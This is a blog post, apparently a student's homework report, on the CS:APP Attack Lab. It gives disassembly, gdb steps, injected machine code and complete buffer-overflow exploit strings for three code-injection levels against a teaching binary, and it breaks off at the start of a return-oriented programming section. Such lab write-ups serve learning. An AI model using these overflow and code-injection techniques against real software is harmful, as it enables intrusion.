@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    <meta name="description" content="Hexo Theme Redefine">
+    <meta name="author" content="johnnycake">
+    <link rel="canonical" href="http://example.com/2023/01/19/attack-lab/" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-redefine.png">
+    <link rel="icon" type="image/png" href="/images/logo.JPG" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.JPG">
+    <link rel="shortcut icon" href="/images/logo.JPG">
+    
+    <title>
+        
+            Attack Lab Report |
+        
+        Johnnycake&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/fonts.css">
+
+    
+    <link rel="preconnect" href="https://evan.beee.top" crossorigin>
+    <script id="hexo-configurations">
+    let REDEFINE = window.REDEFINE || {};
+    REDEFINE.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    REDEFINE.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#005080","avatar":"/images/avatar.JPG","favicon":"/images/logo.JPG","article_img_align":"center","right_side_width":"210px","content_max_width":"1000px","nav_color":{"left":"#f78736","right":"#367df7","transparency":35},"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_image":{"light":"/images/hall_light.JPG","dark":"/images/hall_dark.JPG"},"title_color":{"light":"#323739","dark":"#ffffff"},"description":"Though, never tried a johnnycake..."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_block":{"copy":true,"style":"mac"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"0.5.2","friend_links":{"columns":2}};
+    REDEFINE.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+    
+    
+<link rel="stylesheet" href="/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/brands.min.css">
+
+    
+<link rel="stylesheet" href="/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/css/regular.min.css">
+
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+    
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Johnnycake&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                            <li class="menu-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="menu-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="menu-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/fleurs03">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                    <li class="drawer-menu-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-menu-item flex-center">
+                        <a class="" 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-menu-item flex-center">
+                        <a class="has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="dropdown-item flex-center">
+                                <a class="dropdown-item" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="dropdown-item flex-center">
+                                <a class="dropdown-item" target="_blank" rel="noopener" href="https://github.com/fleurs03">GITHUB</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+            <div class="article-title">
+                <span class="title-hover-animation"><h1 style="font-size:2rem; font-weight: bold; margin: 10px 0;">Attack Lab Report</h1></span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.JPG">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">johnnycake</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="pc">2023-01-19 23:00:02</span>
+        <span class="mobile">2023-01-19 23:00</span>
+    </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/ics/">ics</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/homework/">homework</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-file-word"></i>&nbsp;<span>3.4k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>18 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <h2 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a>实验目的：</h2><ul>
+<li>learn different ways that attackers can exploit security vulnerabilities when programs do not safeguard themselves well enough against buffer overflows</li>
+<li>get a better understanding of how to write programs that are more secure, as well as some of the features provided by compilers and operating systems to make programs less vulnerable</li>
+<li>gain a deeper understanding of the stack and parameter-passing mechanisms of x86-64 machine code</li>
+<li>gain a deeper understanding of how x86-64 instructions are encoded</li>
+<li>gain more experience with debugging tools such as GDB and OBJDUMP</li>
+</ul>
+<h2 id="实验内容："><a href="#实验内容：" class="headerlink" title="实验内容："></a>实验内容：</h2><h4 id="实验原理："><a href="#实验原理：" class="headerlink" title="实验原理："></a>实验原理：</h4><p>​		Functions Gets() and gets() have no way to determine whether their destination buffers are large enough to store the string they read. They simply copy sequences of bytes, possibly overrunning the bounds of the storage allocated at the destinations. So we can feed CTARGET and RTARGET so that they do more interesting things. These are called <em>exploit</em> strings.</p>
+<h3 id="Code-Injection-Attacks："><a href="#Code-Injection-Attacks：" class="headerlink" title="Code Injection Attacks："></a>Code Injection Attacks：</h3><h4 id="实验原理：-1"><a href="#实验原理：-1" class="headerlink" title="实验原理："></a>实验原理：</h4><p>​		This program CTARGET is set up in a way that the stack positions will be consistent from one run to the next and so that data on the stack can be treated as executable code. These features make the program vulnerable to attacks where the exploit strings contain the byte encodings of executable code.</p>
+<h4 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1:"></a>Level 1:</h4><ul>
+<li><p>观察所给出的代码：</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> val;</span><br><span class="line">	val = <span class="built_in">getbuf</span>();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">	<span class="built_in">validate</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>可知只需触发 touch1 即可通过</p>
+</li>
+<li><p>将 ctarget 反汇编：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ctarget &gt; ctarget.txt</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>观察 getbuf 的反汇编：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0000000000401c23 &lt;getbuf&gt;:</span><br><span class="line">  401c23:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401c27:	48 83 ec 38          	sub    $0x38,%rsp</span><br><span class="line">  401c2b:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  401c2e:	e8 b5 02 00 00       	callq  401ee8 &lt;Gets&gt;</span><br><span class="line">  401c33:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  401c38:	48 83 c4 38          	add    $0x38,%rsp</span><br><span class="line">  401c3c:	c3                   	retq   </span><br></pre></td></tr></table></figure></div>
+
+<p>可知 getbuf 的开辟了 0x38 字节栈空间</p>
+<p>由于 getbuf 并不会判断缓冲区的溢出，因而可以输入通过超长的字符串，在填充满缓冲区后将返回地址用 touch1 的首地址覆盖</p>
+</li>
+<li><p>观察 touch1 的反汇编：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0000000000401c3d &lt;touch1&gt;:</span><br><span class="line">  401c3d:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401c41:	50                   	push   %rax</span><br><span class="line">  401c42:	58                   	pop    %rax</span><br><span class="line">  401c43:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  401c47:	c7 05 ab 58 00 00 01 	movl   $0x1,0x58ab(%rip)        # 4074fc &lt;vlevel&gt;</span><br><span class="line">  401c4e:	00 00 00 </span><br><span class="line">  401c51:	48 8d 3d a9 26 00 00 	lea    0x26a9(%rip),%rdi        # 404301 &lt;_IO_stdin_used+0x301&gt;</span><br><span class="line">  401c58:	e8 23 f4 ff ff       	callq  401080 &lt;puts@plt&gt;</span><br><span class="line">  401c5d:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401c62:	e8 f4 04 00 00       	callq  40215b &lt;validate&gt;</span><br><span class="line">  401c67:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401c6c:	e8 6f f5 ff ff       	callq  4011e0 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>得到 touch1 的首地址为 0x401c3d，将其写成小端法，覆盖返回地址</p>
+</li>
+<li><p>最终填入字符串如下：（# 后的为注释）</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 # 填充分配的栈空间</span><br><span class="line">3d 1c 40 00 00 00 00 00 # touch1 的首地址</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>用栈的分配图示意：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/attack-lab.assets/stack1.png"
+                      alt="stack1"
+                ></p>
+</li>
+</ul>
+<h4 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2:"></a>Level 2:</h4><ul>
+<li><p>观察所给出代码：</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>;       <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!:You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		<span class="built_in">validate</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;Misfire:You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		<span class="built_in">fail</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>可知需要触发 touch2 且同时将 cookie 作为 unsigned 类型的参数传入，方可通过。</p>
+</li>
+<li><p>观察 touch2 的反汇编：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0000000000401c71 &lt;touch2&gt;:</span><br><span class="line">  401c71:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401c75:	50                   	push   %rax</span><br><span class="line">  401c76:	58                   	pop    %rax</span><br><span class="line">  401c77:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  401c7b:	89 fa                	mov    %edi,%edx</span><br><span class="line">  401c7d:	c7 05 75 58 00 00 02 	movl   $0x2,0x5875(%rip)        # 4074fc &lt;vlevel&gt;</span><br><span class="line">  401c84:	00 00 00 </span><br><span class="line">  401c87:	39 3d 77 58 00 00    	cmp    %edi,0x5877(%rip)        # 407504 &lt;cookie&gt;</span><br><span class="line">  401c8d:	74 2a                	je     401cb9 &lt;touch2+0x48&gt;</span><br><span class="line">  401c8f:	48 8d 35 ba 26 00 00 	lea    0x26ba(%rip),%rsi        # 404350 &lt;_IO_stdin_used+0x350&gt;</span><br><span class="line">  401c96:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401c9b:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401ca0:	e8 eb f4 ff ff       	callq  401190 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401ca5:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  401caa:	e8 80 05 00 00       	callq  40222f &lt;fail&gt;</span><br><span class="line">  401caf:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401cb4:	e8 27 f5 ff ff       	callq  4011e0 &lt;exit@plt&gt;</span><br><span class="line">  401cb9:	48 8d 35 68 26 00 00 	lea    0x2668(%rip),%rsi        # 404328 &lt;_IO_stdin_used+0x328&gt;</span><br><span class="line">  401cc0:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401cc5:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401cca:	e8 c1 f4 ff ff       	callq  401190 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401ccf:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  401cd4:	e8 82 04 00 00       	callq  40215b &lt;validate&gt;</span><br><span class="line">  401cd9:	eb d4                	jmp    401caf &lt;touch2+0x3e&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>可得到 touch2 的首地址为 0x401c71</p>
+</li>
+<li><p>通过注入一段代码将 cookie 存入 %rdi 中，以作为第一个参数传入 touch2，并随后返回 touch2</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq    $0x23d99ec8, %rdi</span><br><span class="line">pushq   $0x401c71</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>通过 gcc 将其编译再反汇编，得到机器码</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c ci2.s</span><br><span class="line">objdump -d ci2.o &gt; ci2.txt</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bf c8 9e d9 23</span><br><span class="line">68 71 1c 40 00</span><br><span class="line">c3 </span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>借助 gdb 获取读入字符时的 %rsp</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb ctarget</span><br><span class="line">(gdb) <span class="built_in">break</span> *0x401c2b</span><br><span class="line">(gdb) run -q</span><br><span class="line">(gdb) p <span class="variable">$rsp</span></span><br></pre></td></tr></table></figure></div>
+
+<p>得到 %rsp 的值为 0x556335f8</p>
+</li>
+<li><p>最终填入字符串如下：（# 后的为注释）</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bf c8 9e d9 23 68 71 1c</span><br><span class="line">40 00 c3 00 00 00 00 00 # 注入代码</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 # 填充分配的栈空间</span><br><span class="line">f8 35 63 55 00 00 00 00 # 注入代码的地址</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>栈的分配示意图如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/attack-lab.assets/stack2.png"
+                      alt="stack2"
+                ></p>
+</li>
+</ul>
+<h4 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3:"></a>Level 3:</h4><ul>
+<li><p>观察所给出代码：</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">	<span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">	<span class="type">char</span> *s = cbuf + <span class="built_in">random</span>() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch3</span><span class="params">(<span class="type">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;       <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">hexmatch</span>(cookie, sval)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        <span class="built_in">validate</span>(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		<span class="built_in">fail</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>可知需要触发 touch3 且同时将 cookie 作为 char[] 类型的参数传入，方可通过</p>
+</li>
+<li><p>将 cookie 转为16进制的 ascii 码表示：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32 33 64 39 39 65 63 38 00 # 由于是字符串，结尾需要用 &#x27;\0&#x27; 标记</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>注意由于 hexmatch 和 strncmp 都会申请栈空间，因此若字符串存在 getbuf 的栈帧内有一定概率被覆盖。为保险起见，将字符串存于返回地址之后。通过读入字符时 %rsp 的值和注入字符的长度，可以计算出字符串首地址为 0x55633638。</p>
+<p>与 level 2 类似地，可以得到注入代码的机器码，作用为将字符串首地址传入 %rdi，并使其作为第一个参数传入并调用 touch2：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bf 38 36 63 55</span><br><span class="line">68 96 1d 40 00</span><br><span class="line">c3</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>最终填入字符串如下：（# 后的为注释）</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bf 38 36 63 55 68 96 1d</span><br><span class="line">40 00 c3 00 00 00 00 00 # 注入代码</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 # 填充分配的栈空间</span><br><span class="line">f8 35 63 55 00 00 00 00 # 注入代码的地址</span><br><span class="line">32 33 64 39 39 65 63 38 </span><br><span class="line">00						# cookie 的字符串形式</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>栈的分配示意图如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/attack-lab.assets/stack3.png"
+                      alt="stack3"
+                ></p>
+</li>
+</ul>
+<h3 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return-Oriented Programming:"></a>Return-Oriented Programming:</h3><h4 id="实验原理：-2"><a href="#实验原理：-2" class="headerlink" title="实验原理："></a>实验原理：</h4><p>​		We get useful things done in a program by executing existing code, rather than injecting new code. The most general form of this is referred to as <em>return-oriented programming</em> (ROP) [1, 2]. The strategy with ROP is to identify byte sequences within an existing program that consist of one or more instructions followed by the instruction ret. Such a segment is referred to as a <em>gadget</em>.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/attack-lab.assets/gadget.png"
+                      alt="gadget"
+                ></p>
+<h4 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2:"></a>Level 2:</h4><ul>
+<li><p>再次观察所给出代码：</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>;       <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!:You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		<span class="built_in">validate</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;Misfire:You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		<span class="built_in">fail</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
